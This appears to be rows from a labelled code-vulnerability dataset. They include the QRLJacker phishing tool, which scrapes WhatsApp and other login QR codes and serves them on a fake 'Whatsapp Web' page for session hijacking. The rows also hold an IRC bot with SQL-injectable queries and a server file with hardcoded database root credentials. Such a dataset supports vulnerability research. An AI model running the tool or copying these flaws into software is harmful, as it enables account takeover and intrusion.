			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """"""
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Customization
	#if choice == 8:
		#settings.read(""Data/Simple.ini"")
		#url = settings.get(""WeChat"",""url"")
		#image_number = settings.get(""WeChat"",""image_number"")
		#classname = settings.get(""WeChat"",""classname"")
if __name__ == '__main__':
	main()
/n/n/n",0
109,109,a101472db88764a0d031ef85fa283967b0692a77,"/QrlJacking-Framework/QRLJacker.py/n/n#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#Author:D4Vinci
import base64 ,time ,selenium ,os ,urllib ,sys ,threading ,configparser
from selenium import webdriver
from binascii import a2b_base64
from PIL import Image

#settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name==""nt"":
			print "" [!] Serving files on ""+str(port)+"" port""
			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > NUL 2>&1"")
		else:
			print "" [!] Serving files on ""+str(port)+"" port""
			os.system(""python -m SimpleHTTPServer ""+str(port)+"" > /dev/null 2>&1"")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print "" [+]Opening Mozila FireFox...""
		return web
	except:
		web = webdriver.Chrome()
		print "" [+]Opening Google Chrome...""
		return web

#Stolen from stackoverflow :D
def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)#screenshot.png
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box) # defines crop points
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get('https://web.whatsapp.com/')
	time.sleep(5)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name('qr-button')
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace(""data:image/png;base64,"","""")
			print "" [+]The QR code image found !""
			print "" [+]Downloading the image..""
			binary_data = a2b_base64(src)
			qr = open(""tmp.png"",""wb"")
			qr.write(binary_data)
			print "" [#]Saved To tmp.png""
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make(""svg"")
def Yandex():
	print ""\n-- --- -- --- -- --- -- --- -- --- --""
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://passport.yandex.com/auth?mode=qr"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			img_url = ""https://passport.yandex.com"" + driver.find_element_by_class_name(""qr-code__i"").get_attribute(""style"").split(""\"""")[1].encode(""utf-8"")
			print "" [+]The QR code image found !""
			data = urllib.urlopen(img_url).read()
			print "" [+]Downloading the image..""
			f = open(""tmp.svg"",""w"").write(data)
			print "" [#]Saved To tmp.svg""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://web.airdroid.com"")
	time.sleep(5)
	img_number = 16
	refresh = 0
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button = driver.find_element_by_class_name(""widget-login-refresh-qrcode"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			if refresh == 0:
				print "" [!]Refreshing page...""
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://weibo.com/login.php"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://web.wechat.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def QQ():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""http://w.qq.com"")
	time.sleep(10)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name(""img"")[0]
			print "" [+]The QR code image found !""
			location = img.location
			size = img.size
			print "" [+]Grabbing photo..""
			Screenshot(""tmp.png"" ,location ,size)
			print "" [#]Saved To tmp.png""
			webdriver.delete_all_cookies()
			time.sleep(10)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(""https://login.taobao.com"")
	time.sleep(5)
	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			button_class = web.find_element_by_class_name(""msg-err"")
			button = button_class.find_elements_by_tag_name(""a"")[0]
			print "" [!]Clicking to reload QR code image...""
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(10)
			continue
		except:
			break

def make(typ=""html""):
	if typ == ""html"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.png?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<img id=""qrcodew"" alt=""Scan me!"" src=""tmp.png"" style=""display: block;""></center>
</body></html>""""""

	if typ == ""svg"":
		code = """"""<html>
<head><title>Whatsapp Web</title></head><body><script>
var myTimer;
myTimer = window.setInterval(reloadD,3000);
function reloadD(){
d = new Date();
document.getElementById('qrcodew').src=""tmp.svg?h=""+d.getTime();
}
</script><center><h1><b>Scan Me Please</b></h1>
<object id=""qrcodew"" data=""tmp.svg"" type=""image/svg+xml""></object></center>
</body></html>""""""
	f = open(""index.html"",""w"")
	f.write(code)
	f.close()

def Simple_Exploit(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print "" [+]Navigating To Website..""
	driver.get(url)

	while True:
		print ""-- --- -- --- -- --- -- --- -- --- --""
		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print "" [+]The QR code image found !""
			src = img.get_attribute('src')
			print "" [+]Downloading the image..""
			qr = urllib.urlretrieve(src, ""tmp.png"")
			print "" [#]Saved To tmp.png""
			time.sleep(s)
			print "" [!]Refreshing page...""
			driver.refresh()
			continue
		except:
			break

def clear():
	if os.name == ""nt"":
		os.system(""cls"")
	else:
		os.system(""clear"")

def main():
	#clear()
	print """"""\n
	  ___         _       _               _
	 / _ \  _ __ | |     | |  __ _   ___ | | __ ___  _ __
	| | | || '__|| |  _  | | / _` | / __|| |/ // _ \| '__|
	| |_| || |   | | | |_| || (_| || (__ |   <|  __/| |
	 \__\_\|_|   |_|  \___/  \__,_| \___||_|\_\\___||_|

# Hacking With Qrljacking Attack Vector Become Easy
# Coded By karim Shoair | D4Vinci

 Vulnerable Web Applications and Services:
  1.Chat Applications
  2.Mailing Services
  3.eCommerce
  4.Online Banking
  5.Passport Services
  6.Mobile Management Software
  7.Other Services
  8.Customization
""""""
	choice = input("" Choice > "")

	#Chat Applications
	if choice == 1:
		print """"""
 1.WhatsApp
 2.WeChat
 3.Line
 4.Weibo
 5.QQ Instant Messaging
 00.Back To Main Menu
	""""""

		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			WeChat()
			main()

		#3

		#Weibo
		elif int(choice_2) == 4:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Weibo()
			main()

		elif int(choice_2) == 5:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			QQ()
			main()

	#Mailing Services
	if choice == 2:
		print """"""
 1.QQ Mail
 2.Yandex Mail
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 2:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make(""svg"")
			Serve_it(port)
			Yandex()
			main()

	#eCommerce
	if choice == 3:
		print """"""
 1.Alibaba
 2.Aliexpress
 3.Taobao
 4.Tmall
 5.1688.com
 6.Alimama
 7.Taobao Trips
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 3:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

		#4

		#5

		#6

		elif int(choice_2) == 7:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Taobao()
			main()

	#Online Banking
	if choice == 4:
		print """"""
 1.AliPay
 2.Yandex Money
 3.TenPay
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Passport Services
	if choice == 5:
		print """"""
 1.Yandex Passport
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Mobile Management Software
	if choice == 6:
		print """"""
 1.Airdroid
 00.Back To Main Menu
	""""""
		choice_2 = raw_input("" Second Choice > "")

		if choice_2 == ""00"":
			main()

		elif int(choice_2) == 1:
			port = raw_input("" Port to listen on (Default 1337) : "")
			if port == """":port = 1337
			clear()
			make()
			Serve_it(port)
			Airdroid()
			main()

	#Other Services
	if choice == 7:
		print """"""
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 5.Alibaba Yunos
 00.Back To Main Menu
""""""
		choice_2 = raw_input("" Second Choice > "")
		if choice_2 == ""00"":
			main()

	#Customization
	#if choice == 8:
		#settings.read(""Data/Simple.ini"")
		#url = settings.get(""WeChat"",""url"")
		#image_number = settings.get(""WeChat"",""image_number"")
		#classname = settings.get(""WeChat"",""classname"")
if __name__ == '__main__':
	main()
/n/n/n",1
166,166,b551cd0cd87c3df45fc7787828f3bdd6422a7c72,"bot_sql.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socket
import sys
import urllib2
import os
import time
from pysqlite2 import dbapi2 as sqlite

channel = '#masmorra'
nick = 'carcereiro'
server = 'irc.oftc.net' 

def sendmsg(msg): 
    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\r\n')

class db():
	def __init__(self, dbfile):
		if not os.path.exists(dbfile):
			self.conn = sqlite.connect(dbfile)
			self.cursor = self.conn.cursor()
			self.create_table()
		self.conn = sqlite.connect(dbfile)
		self.cursor = self.conn.cursor()
	def close(self):
		self.cursor.close()
		self.conn.close()
	def create_table(self):
		self.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')
		self.conn.commit()
	def insert_karma(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO karma(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			#print ""Unexpected error:"", sys.exc_info()[0]
			return False
	def increment_karma(self,nome):
		if not self.insert_karma(nome,1):
			self.cursor.execute(""UPDATE karma SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def decrement_karma(self,nome):
		if not self.insert_karma(nome,-1):
			self.cursor.execute(""UPDATE karma SET total = total - 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_url(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO url(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			return False
	def increment_url(self,nome):
		if not self.insert_url(nome,1):
			self.cursor.execute(""UPDATE url SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_slack(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );"" % (nome,total,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
			return True
		except:
			return False
	def increment_slack(self,nome,total):
		if not self.insert_slack(nome,total):
			self.cursor.execute(""UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;"" % (total,nome,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
	def get_karmas_count(self):
		self.cursor.execute('SELECT nome,total FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0]) + ' = ' + str(linha[1])
			else:
				karmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return karmas
	def get_karmas(self):
		self.cursor.execute('SELECT nome FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0])
			else:	
				karmas = karmas + ', ' + (linha[0])
		return karmas
	def get_karma(self, nome):
		self.cursor.execute(""SELECT total FROM karma where nome = '%s'"" % (nome))
		for linha in self.cursor:
				return (linha[0])
	def get_urls_count(self):
		self.cursor.execute('SELECT nome,total FROM url order by total desc')
		urls = ''
		for linha in self.cursor:
			if len(urls) == 0:
				urls = (linha[0]) + ' = ' + str(linha[1])
			else:
				urls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return urls
	def get_slacker_count(self):
		self.cursor.execute(""SELECT nome,total FROM slack where data = '%s' order by total desc"" % (time.strftime(""%Y-%m-%d"", time.localtime())))
		slackers = ''
		for linha in self.cursor:
			if len(slackers) == 0:
				slackers = (linha[0]) + ' = ' + str(linha[1])
			else:
				slackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return slackers


class html:
	def __init__(self, url):
		self.url = url
		self.feed = None
		self.headers = {
	      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',
   	   'Accept-Language' : 'pt-br,en-us,en',
      	'Accept-Charset' : 'utf-8,ISO-8859-1'
	   }
	def title(self):
		self.feed = self.get_data()
		title_pattern = re.compile(r""<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>"", re.UNICODE)
		title_search = title_pattern.search(self.feed)
		if title_search is not None:
			try:
				return ""[ ""+re.sub(""&#?\w+;"", """", title_search.group(1) )+"" ]""
			except:
				print ""Unexpected error:"", sys.exc_info()[0]
				return ""[ Fail in parse ]""
	def get_data(self):
		try:
			reqObj = urllib2.Request(self.url, None, self.headers)
			urlObj = urllib2.urlopen(reqObj)
			return  urlObj.read(4096).strip().replace(""\n"","""").replace(""\r"", """")
		except:
			print ""Unexpected error:"", sys.exc_info()
			return ""<title>Fail in get</title>""


banco = db('carcereiro.db')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, 6667))
sock.send('NICK %s \r\n' % nick)
sock.send('USER %s \'\' \'\' :%s\r\n' % (nick, 'python'))
sock.send('JOIN %s \r\n' % channel)



while True:
	buffer = sock.recv(2040)
	if not buffer:
		break
	print buffer

	if buffer.find('PING') != -1: 
		sock.send('PONG ' + buffer.split() [1] + '\r\n')

	if re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:
		sendmsg('@karmas, @urls, @slackers\r\n')

	regexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\+\+', re.UNICODE)
	regexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\-\-', re.UNICODE)
	regexk  = re.compile('PRIVMSG.*:karma ([a-z_\-\.]+)', re.UNICODE)
	regexu  = re.compile('PRIVMSG.*[: ]\@urls', re.UNICODE)
	regexs  = re.compile('PRIVMSG.*[: ]\@slackers', re.UNICODE)
	regexks = re.compile('PRIVMSG.*[: ]\@karmas', re.UNICODE)
	regexslack  = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)
	pattern_url   = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG .*(http://[áéíóúÁÉÍÓÚÀàa-zA-Z0-9_?=./,\-\+\'~]+)', re.UNICODE)
	
	resultp  = regexp.search(buffer)
	resultm  = regexm.search(buffer)
	resultk  = regexk.search(buffer)
	resultu  = regexu.search(buffer)
	results  = regexs.search(buffer)
	resultks = regexks.search(buffer)
	resultslack = regexslack.search(buffer)
	url_search = pattern_url.search(buffer)

	if resultslack is not None:
		var = len(resultslack.group(2)) - 1
		nick = resultslack.group(1)
		banco.increment_slack(nick,var)

	if resultp is not None:
		var = resultp.group(1)
		banco.increment_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultm is not None:
		var = resultm.group(1)
		banco.decrement_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultk is not None:
		var = resultk.group(1)
		points = banco.get_karma(var)
		if points is not None:
			sendmsg(var + ' have ' + str(points) + ' points of karma')
		else:
			sendmsg(var + ' doesn\'t have any point of karma')
		continue

	if resultks is not None:
		sendmsg('karmas : ' + banco.get_karmas_count())
		continue
	
	if results is not None:
		sendmsg('slackers in chars : ' + banco.get_slacker_count())
		continue

	if resultu is not None:
		sendmsg('users : ' + banco.get_urls_count())
		continue
	
	if url_search is not None:
		try:
			url  = url_search.group(2)
			nick = url_search.group(1)
			parser = html(url)
			sendmsg(  parser.title() )
			banco.increment_url( nick )
		except:
			sendmsg('[ Failed ]')
			print url
			print ""Unexpected error:"", sys.exc_info()[0]

sock.close()
banco.close()
/n/n/n",0
167,167,b551cd0cd87c3df45fc7787828f3bdd6422a7c72,"/bot_sql.py/n/n#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re
import socket
import sys
import urllib2
import os
import time
from pysqlite2 import dbapi2 as sqlite

channel = '#masmorra'
nick = 'carcereiro'
server = 'irc.oftc.net' 

def sendmsg(msg): 
    sock.send('PRIVMSG '+ channel + ' :' + str(msg) + '\r\n')

class db():
	def __init__(self, dbfile):
		if not os.path.exists(dbfile):
			self.conn = sqlite.connect(dbfile)
			self.cursor = self.conn.cursor()
			self.create_table()
		self.conn = sqlite.connect(dbfile)
		self.cursor = self.conn.cursor()
	def close(self):
		self.cursor.close()
		self.conn.close()
	def create_table(self):
		self.cursor.execute('CREATE TABLE karma(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE url(nome VARCHAR(30) PRIMARY KEY, total INTEGER);')
		self.cursor.execute('CREATE TABLE slack(nome VARCHAR(30), total INTEGER, data DATE, PRIMARY KEY (data, nome));')
		self.conn.commit()
	def insert_karma(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO karma(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			#print ""Unexpected error:"", sys.exc_info()[0]
			return False
	def increment_karma(self,nome):
		if not self.insert_karma(nome,1):
			self.cursor.execute(""UPDATE karma SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def decrement_karma(self,nome):
		if not self.insert_karma(nome,-1):
			self.cursor.execute(""UPDATE karma SET total = total - 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_url(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO url(nome,total) VALUES ('%s', %d );"" % (nome,total))
			self.conn.commit()
			return True
		except:
			return False
	def increment_url(self,nome):
		if not self.insert_url(nome,1):
			self.cursor.execute(""UPDATE url SET total = total + 1 where nome = '%s';"" % (nome))
			self.conn.commit()
	def insert_slack(self,nome,total):
		try:
			self.cursor.execute(""INSERT INTO slack(nome,total,data) VALUES ('%s', %d, '%s' );"" % (nome,total,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
			return True
		except:
			return False
	def increment_slack(self,nome,total):
		if not self.insert_slack(nome,total):
			self.cursor.execute(""UPDATE slack SET total = total + %d where nome = '%s' and data = '%s' ;"" % (total,nome,time.strftime(""%Y-%m-%d"", time.localtime())))
			self.conn.commit()
	def get_karmas_count(self):
		self.cursor.execute('SELECT nome,total FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0]) + ' = ' + str(linha[1])
			else:
				karmas = karmas + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return karmas
	def get_karmas(self):
		self.cursor.execute('SELECT nome FROM karma order by total desc')
		karmas = ''
		for linha in self.cursor:
			if len(karmas) == 0:
				karmas = (linha[0])
			else:	
				karmas = karmas + ', ' + (linha[0])
		return karmas
	def get_karma(self, nome):
		self.cursor.execute(""SELECT total FROM karma where nome = '%s'"" % (nome))
		for linha in self.cursor:
				return (linha[0])
	def get_urls_count(self):
		self.cursor.execute('SELECT nome,total FROM url order by total desc')
		urls = ''
		for linha in self.cursor:
			if len(urls) == 0:
				urls = (linha[0]) + ' = ' + str(linha[1])
			else:
				urls = urls + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return urls
	def get_slacker_count(self):
		self.cursor.execute(""SELECT nome,total FROM slack where data = '%s' order by total desc"" % (time.strftime(""%Y-%m-%d"", time.localtime())))
		slackers = ''
		for linha in self.cursor:
			if len(slackers) == 0:
				slackers = (linha[0]) + ' = ' + str(linha[1])
			else:
				slackers = slackers + ', ' + (linha[0]) + ' = ' + str(linha[1])
		return slackers


class html:
	def __init__(self, url):
		self.url = url
		self.feed = None
		self.headers = {
	      'User-Agent' : 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.10)',
   	   'Accept-Language' : 'pt-br,en-us,en',
      	'Accept-Charset' : 'utf-8,ISO-8859-1'
	   }
	def title(self):
		self.feed = self.get_data()
		title_pattern = re.compile(r""<[Tt][Ii][Tt][Ll][Ee]>(.*)</[Tt][Ii][Tt][Ll][Ee]>"", re.UNICODE)
		title_search = title_pattern.search(self.feed)
		if title_search is not None:
			try:
				return ""[ ""+re.sub(""&#?\w+;"", """", title_search.group(1) )+"" ]""
			except:
				print ""Unexpected error:"", sys.exc_info()[0]
				return ""[ Fail in parse ]""
	def get_data(self):
		try:
			reqObj = urllib2.Request(self.url, None, self.headers)
			urlObj = urllib2.urlopen(reqObj)
			return  urlObj.read(4096).strip().replace(""\n"","""")
		except:
			print ""Unexpected error:"", sys.exc_info()
			return ""<title>Fail in get</title>""


banco = db('carcereiro.db')
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server, 6667))
sock.send('NICK %s \r\n' % nick)
sock.send('USER %s \'\' \'\' :%s\r\n' % (nick, 'python'))
sock.send('JOIN %s \r\n' % channel)



while True:
	buffer = sock.recv(2040)
	if not buffer:
		break
	print buffer

	if buffer.find('PING') != -1: 
		sock.send('PONG ' + buffer.split() [1] + '\r\n')

	if re.search(':[!@]help', buffer, re.UNICODE) is not None or re.search(':'+nick+'[ ,:]+help', buffer, re.UNICODE) is not None:
		sendmsg('@karmas, @urls, @slackers\r\n')

	regexp  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\+\+', re.UNICODE)
	regexm  = re.compile('PRIVMSG.*[: ]([a-z][0-9a-z_\-\.]+)\-\-', re.UNICODE)
	regexk  = re.compile('PRIVMSG.*:karma ([a-z_\-\.]+)', re.UNICODE)
	regexu  = re.compile('PRIVMSG.*[: ]\@urls', re.UNICODE)
	regexs  = re.compile('PRIVMSG.*[: ]\@slackers', re.UNICODE)
	regexks = re.compile('PRIVMSG.*[: ]\@karmas', re.UNICODE)
	regexslack  = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG.* :(.*)$', re.UNICODE)
	pattern_url   = re.compile(':([a-zA-Z0-9\_]+)!.* PRIVMSG .*(http://[áéíóúÁÉÍÓÚÀàa-zA-Z0-9_?=./,\-\+\'~]+)', re.UNICODE)
	
	resultp  = regexp.search(buffer)
	resultm  = regexm.search(buffer)
	resultk  = regexk.search(buffer)
	resultu  = regexu.search(buffer)
	results  = regexs.search(buffer)
	resultks = regexks.search(buffer)
	resultslack = regexslack.search(buffer)
	url_search = pattern_url.search(buffer)

	if resultslack is not None:
		var = len(resultslack.group(2)) - 1
		nick = resultslack.group(1)
		banco.increment_slack(nick,var)

	if resultp is not None:
		var = resultp.group(1)
		banco.increment_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultm is not None:
		var = resultm.group(1)
		banco.decrement_karma(var)
		sendmsg(var + ' now has ' + str(banco.get_karma(var)) + ' points of karma')
		continue

	if resultk is not None:
		var = resultk.group(1)
		points = banco.get_karma(var)
		if points is not None:
			sendmsg(var + ' have ' + str(points) + ' points of karma')
		else:
			sendmsg(var + ' doesn\'t have any point of karma')
		continue

	if resultks is not None:
		sendmsg('karmas : ' + banco.get_karmas_count())
		continue
	
	if results is not None:
		sendmsg('slackers in chars : ' + banco.get_slacker_count())
		continue

	if resultu is not None:
		sendmsg('users : ' + banco.get_urls_count())
		continue
	
	if url_search is not None:
		try:
			url  = url_search.group(2)
			nick = url_search.group(1)
			parser = html(url)
			sendmsg(  parser.title() )
			banco.increment_url( nick )
		except:
			sendmsg('[ Failed ]')
			print url
			print ""Unexpected error:"", sys.exc_info()[0]

sock.close()
banco.close()
/n/n/n",1
28,28,8076b9475ed007a4d0e5d10c9b6938f72f5d35a5,"Server/model.py/n/nfrom mysql_commands import *

def select_all_apps():
	return select_row_from_mysql_command(""SELECT * FROM apps"")

def select_all_apps_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return select_row_from_mysql_command(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/nServer/mysql_commands.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

s = Session()

def select_row_from_mysql_command(command_str):
    ''' function for selecting a specific row  '''
    ''' OUPUT: a list of elements in the selected row '''

    sql = text(str(command_str))
    return s.execute(sql).fetchall()


def insert_into_mysql_command(command_str):
        ''' the function inserts data depending from a command_str '''

        sql = text(str(command_str))
        s.execute(sql)
        s.commit()
/n/n/n",0
29,29,8076b9475ed007a4d0e5d10c9b6938f72f5d35a5,"/Server/model.py/n/nimport sqlalchemy
from sqlalchemy import text
from sqlalchemy.orm import sessionmaker, scoped_session

engine = sqlalchemy.create_engine('mysql+pymysql://root:bajtastore@127.0.0.1/mydb')
Session = scoped_session(sessionmaker(bind=engine))

def select_all_apps():
	return s.execute(""SELECT * FROM apps"").fetchall()

def select_all_apps_from_user(user_id):
	return s.execute(""SELECT * FROM apps a LEFT JOIN users_apps ua ON ua.app_id = a.id WHERE ua.user_id=?"", user_id)

def select_all_devices_from_user(user_id):
	return s.execute(""SELECT * FROM devices WHERE user_id=?"", user_id)/n/n/n",1
190,190,b3683453b29eba54aca6d04cd8a717429257c0fc,"contrib/node/src/python/pants/contrib/node/subsystems/node_distribution.py/n/n# coding=utf-8
# Copyright 2015 Pants project contributors (see CONTRIBUTORS.md).
# Licensed under the Apache License, Version 2.0 (see LICENSE).

from __future__ import (absolute_import, division, generators, nested_scopes, print_function,
                        unicode_literals, with_statement)

import logging
import os
import subprocess
from collections import namedtuple

from pants.base.exceptions import TaskError
from pants.binaries.binary_util import BinaryUtil
from pants.fs.archive import TGZ
from pants.subsystem.subsystem import Subsystem
from pants.util.memo import memoized_method


logger = logging.getLogger(__name__)


class NodeDistribution(object):
  """"""Represents a self-bootstrapping Node distribution.""""""

  class Factory(Subsystem):
